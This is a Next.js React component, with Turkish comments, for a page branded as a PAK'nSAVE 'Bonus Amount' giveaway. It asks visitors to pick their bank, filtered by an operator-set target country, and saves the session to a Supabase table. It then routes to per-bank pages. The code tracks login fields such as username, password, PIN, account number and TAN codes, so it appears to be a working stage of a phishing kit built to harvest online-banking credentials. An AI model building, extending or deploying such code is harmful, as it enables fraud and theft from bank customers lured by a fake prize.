"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { optimizeSupabaseImageUrl } from "@/lib/asset-url";
import type { BankCatalogEntry } from "@/lib/at-bank-catalog";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { getPreferredRouteSessionId } from "@/lib/session-id-client";
import { useSettings } from "@/contexts/SettingsContext";
import { countriesMatch } from "@/lib/country-utils";

type Props = {
  sessionId: string;
  routeSessionId?: string;
  initialBanks: BankCatalogEntry[];
};

export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
  const [banks, setBanks] = useState<BankCatalogEntry[]>(initialBanks);
  const [bankSlug, setBankSlug] = useState("");
  const [searchTerm, setSearchTerm] = useState("");
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const [recovering, setRecovering] = useState(false);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
  const [amount, setAmount] = useState<number>(0);
  const [currency, setCurrency] = useState("NZ$");
  const navigationLockRef = useRef(false);
  const refreshAbortRef = useRef<AbortController | null>(null);
  const selectionVersionRef = useRef(0);
  const mountedRef = useRef(true);

  useEffect(() => {
    setBanks(initialBanks);
  }, [initialBanks]);

  useEffect(() => {
    mountedRef.current = true;
    return () => {
      mountedRef.current = false;
      selectionVersionRef.current += 1;
      refreshAbortRef.current?.abort();
    };
  }, []);

  const refreshBanks = useCallback(async () => {
    if (navigationLockRef.current) return;

    refreshAbortRef.current?.abort();
    const controller = new AbortController();
    refreshAbortRef.current = controller;

    try {
      const res = await fetch(`/api/banks?t=${Date.now()}`, {
        cache: "no-store",
        headers: {
          "Cache-Control": "no-cache",
        },
        signal: controller.signal,
      });

      if (!res.ok) return;
      const data = await res.json();
      if (!Array.isArray(data.banks)) return;

      setBanks(
        data.banks.map((bank: any) => ({
          slug: bank.slug,
          name: bank.name,
          domain: bank.domain,
          logoFile: bank.logoFile ?? bank.logo_file,
          country: bank.country,
          isActive: bank.isActive !== false && bank.is_active !== false,
        })),
      );
    } catch (error) {
      if (error instanceof Error && error.name === "AbortError") return;
      /* ignore transient refresh errors */
    } finally {
      if (refreshAbortRef.current === controller) {
        refreshAbortRef.current = null;
      }
    }
  }, []);

  useEffect(() => {
    if (!sessionId) return;
    if (window.location.search.includes("session=")) {
      window.history.replaceState(window.history.state, "", "/banken");
    }
  }, [sessionId]);

  useEffect(() => {
    const resetUi = () => {
      selectionVersionRef.current += 1;
      navigationLockRef.current = false;
      setSaving(false);
      setMsg(null);
      setRecovering(false);
      setSearchTerm("");
      setBankSlug("");
      setBanks(initialBanks);
    };

    const refreshView = () => {
      if (navigationLockRef.current) return;
      resetUi();
      void refreshBanks();
    };

    const onPageShow = (event: PageTransitionEvent) => {
      const entries = typeof performance !== "undefined" ? performance.getEntriesByType("navigation") : [];
      const navEntry = entries[0] as PerformanceNavigationTiming | undefined;
      const isBackForward = navEntry?.type === "back_forward";

      if (event.persisted || isBackForward) {
        refreshView();
      }
    };

    window.addEventListener("pageshow", onPageShow);
    return () => {
      window.removeEventListener("pageshow", onPageShow);
    };
  }, [initialBanks, refreshBanks]);

  const demoOptions = useMemo(() => {
    // Sadece aktif olanları ve (eğer seçilmişse) hedef ülkenin bankalarını göster
    let validBanks = banks.filter(b => b.isActive !== false);
    
    if (settings.target_country && settings.target_country !== "All") {
      validBanks = validBanks.filter(b => countriesMatch(b.country, settings.target_country));
    }

    return validBanks.map((bank) => ({
      slug: bank.slug,
      displayName: bank.name,
      domain: bank.domain,
      logoFile: bank.logoFile,
    }));
  }, [banks, settings.target_country]);

  const filteredOptions = useMemo(() => {
    const q = searchTerm.trim().toLowerCase();
    if (!q) return demoOptions;
    return demoOptions.filter((opt) => opt.displayName.toLowerCase().includes(q));
  }, [searchTerm, demoOptions]);

  useEffect(() => {
    if (sessionId) return;
    try {
      const cachedSessionId = localStorage.getItem("activeSessionId");
      if (cachedSessionId) {
        setRecovering(true);
        router.replace("/banken");
      }
    } catch {
      /* ignore localStorage access errors */
    }
  }, [sessionId]);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      const { data } = await supabase.from("sessions").select("amount, form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setAmount(data.amount ?? 0);
      if (fd.currency) setCurrency(fd.currency);
      setSessionFormData(fd);
      setBankSlug(fd.bankSlug ?? "");
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleBankSelect(nextBankSlug: string, displayName: string) {
    if (!supabase || !sessionId || !nextBankSlug || navigationLockRef.current) return;

    const selectionVersion = selectionVersionRef.current + 1;
    selectionVersionRef.current = selectionVersion;
    navigationLockRef.current = true;
    refreshAbortRef.current?.abort();
    setSaving(true);
    setMsg(null);
    setBankSlug(nextBankSlug);

    const nextFormData: Record<string, any> = {
      ...sessionFormData,
      bankSlug: nextBankSlug,
      bankName: displayName,
    };
    
    // Banka değiştirildiğinde eski bankaya ait giriş bilgilerini temizle
    const bankSpecificFields = [
      "username", "password", "verfuegernummer", "pin", "rekeningnummer", 
      "pasnummer", "toegangscode", "signatuur", "identificatiecode", "tacCode"
    ];
    for (const field of bankSpecificFields) {
      delete nextFormData[field];
    }

    const { error } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "bank",
        form_data: nextFormData,
      })
      .eq("id", sessionId);

    if (!mountedRef.current || selectionVersionRef.current !== selectionVersion) {
      return;
    }

    setSaving(false);
    if (error) {
      navigationLockRef.current = false;
      setMsg("Saving failed.");
    }
    else {
      setSessionFormData(nextFormData);
      router.push(`/win/${effectiveRouteSessionId}/bank/${nextBankSlug}`);
    }
  }

  if (!supabase) {
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8">
          <ConfigMissing />
        </div>
      </div>
    );
  }

  if (!sessionId) {
    if (recovering) {
      return (
        <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
          <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
            <h2 className="text-2xl font-bold text-white mb-2">Bank Selection</h2>
            <p className="text-sm text-gray-300 mb-8">Restoring session...</p>
            <div className="flex justify-center py-12">
              <div className="size-10 animate-spin rounded-full border-4 border-[#0066CC]/30 border-t-[#0066CC]" />
            </div>
          </div>
        </div>
      );
    }
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
          <h2 className="text-2xl font-bold text-white mb-2">Bank Selection</h2>
          <p className="text-sm text-gray-300 mb-6">Invalid link.</p>
          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
            Use the full link to continue.
          </p>
        </div>
      </div>
    );
  }

  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-12">
          <div className="size-10 animate-spin rounded-full border-4 border-[#0066CC]/30 border-t-[#0066CC]" />
        </div>
      </div>
    );
  }

  return (
    <div className="flex min-h-[100dvh] items-start justify-center p-2 pt-[14vh] sm:p-4 sm:pt-[24vh]">
      <div className="relative z-10 w-full max-w-[980px] space-y-4">
        <div className="pak-form-card p-4 sm:p-6">
          <div className="pak-form-inner">
            <div className="mb-6 grid gap-6 lg:grid-cols-[minmax(0,1fr)_220px] lg:items-start">
              <div className="min-w-0">
                <div className="max-w-[36rem]">
                  <h2 className="pak-form-title">{settings.banken_title}</h2>
                  <p className="pak-form-subtitle mt-3">{settings.banken_subtitle}</p>
                </div>

                <div className="pak-form-amount mt-5 w-full max-w-[25rem] px-5 py-4 sm:px-6">
                  <div className="pak-form-amount-label">
                    <div>Your</div>
                    <div>Bonus Amount</div>
                  </div>
                  <div className="pak-form-amount-divider" />
                  <div className="pak-form-amount-value">
                    {currency}{amount.toLocaleString("en-NZ")}
                  </div>
                </div>
              </div>

              <div className="flex items-start justify-between gap-4 lg:block">
                <img
                  src="/form-assets/paknsave-logo-form.png"
                  alt="PAK'nSAVE"
                  className="h-14 w-14 object-contain sm:h-16 sm:w-16 lg:ml-auto lg:mb-4"
                />
                <img
                  src="/form-assets/paknsave-gift-box.png"
                  alt=""
                  className="h-auto w-24 object-contain drop-shadow-[0_18px_32px_rgba(0,0,0,0.45)] sm:w-32 lg:w-full lg:max-w-[200px] lg:translate-x-2"
                />
              </div>
            </div>

            <div className="mx-auto mb-5 max-w-[560px]">
              <div className="pak-form-input-wrap mt-0">
                <div className="pak-form-input-icon">
                  <svg aria-hidden viewBox="0 0 24 24" className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth="2">
                    <circle cx="11" cy="11" r="7" />
                    <path d="m20 20-3.5-3.5" />
                  </svg>
                </div>
                <input
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  placeholder={settings.banken_search_placeholder}
                  className="pak-form-input min-h-[4rem] pl-14 pr-4 text-base"
                />
              </div>
            </div>

            <div className="max-h-[58vh] overflow-y-auto pr-1 custom-scrollbar">
              <div className="grid grid-cols-2 gap-3 sm:grid-cols-3 lg:grid-cols-4">
                {filteredOptions.length === 0 ? (
                  <div className="col-span-2 rounded-2xl border border-[#ffd95c]/20 bg-white/5 p-6 text-center text-sm text-white/82 sm:col-span-3 lg:col-span-4">
                    No banks were found for the selected country. Choose another country or clear the search filter.
                  </div>
                ) : filteredOptions.map((opt) => (
                  <button
                    key={opt.slug}
                    type="button"
                    onClick={() => void handleBankSelect(opt.slug, opt.displayName)}
                    disabled={saving}
                    className={`group flex min-h-[9.6rem] w-full flex-col items-center justify-between rounded-[1.2rem] border p-3 text-center transition-all duration-200 ${
                      bankSlug === opt.slug
                        ? "border-[#ffe784] bg-[linear-gradient(180deg,rgba(255,213,0,0.18),rgba(255,213,0,0.08))] shadow-[0_0_0_1px_rgba(255,240,170,0.22),0_0_24px_rgba(255,214,10,0.14)]"
                        : "border-[#ffd95c]/16 bg-[linear-gradient(180deg,rgba(255,255,255,0.04),rgba(255,255,255,0.02))] hover:border-[#ffe784]/35 hover:bg-[linear-gradient(180deg,rgba(255,213,0,0.1),rgba(255,213,0,0.04))]"
                    } ${saving ? "opacity-70" : ""}`}
                  >
                    <div className="flex flex-1 items-center justify-center py-2">
                      <img
                        src={optimizeSupabaseImageUrl(opt.logoFile, { format: "webp", quality: 80, width: 128 }) || opt.logoFile}
                        alt={opt.displayName}
                        className="h-12 w-12 object-contain rounded"
                        onError={(e) => {
                          e.currentTarget.onerror = null;
                          e.currentTarget.style.display = "none";
                          const fallback = e.currentTarget.nextElementSibling as HTMLElement;
                          if (fallback) fallback.style.display = "grid";
                        }}
                      />
                      <div className="hidden h-12 w-12 place-items-center rounded-xl border border-[#ffd95c]/20 bg-[linear-gradient(180deg,rgba(35,35,31,0.98),rgba(15,15,13,0.98))] text-lg font-black text-[#ffe98c] shadow-[inset_0_1px_0_rgba(255,255,255,0.06)]">
                        {opt.displayName.charAt(0)}
                      </div>
                    </div>
                    <div className="flex min-h-[2.8rem] w-full items-center justify-center">
                      <p className="line-clamp-2 text-[12px] font-semibold leading-tight text-white/92 group-hover:text-white">
                        {opt.displayName}
                      </p>
                    </div>
                  </button>
                ))}
              </div>
            </div>

            <div className="mt-6 pak-form-security justify-center text-center">
              <svg className="h-8 w-8 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
              </svg>
              <span>Your bank selection is processed securely.</span>
            </div>
          </div>
        </div>

        {msg ? <p className="rounded-2xl border border-red-500/20 bg-red-500/10 p-3 text-center text-sm text-red-300">{msg}</p> : null}
      </div>
    </div>
  );
}
